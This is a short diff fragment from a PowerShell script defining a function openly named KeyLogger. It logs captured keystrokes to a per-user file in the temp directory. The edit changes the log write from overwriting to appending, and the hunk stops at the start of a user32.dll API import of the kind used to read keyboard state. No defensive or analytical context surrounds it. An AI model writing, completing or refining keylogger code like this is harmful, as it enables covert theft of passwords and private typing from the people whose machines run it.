@@ -1,6 +1,6 @@
 function KeyLogger($logFilePath = "$env:temp/$env:Username.log"){
 
-    echo "">$logFilePath
+    echo "" >> $logFilePath
 
 $APISignatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
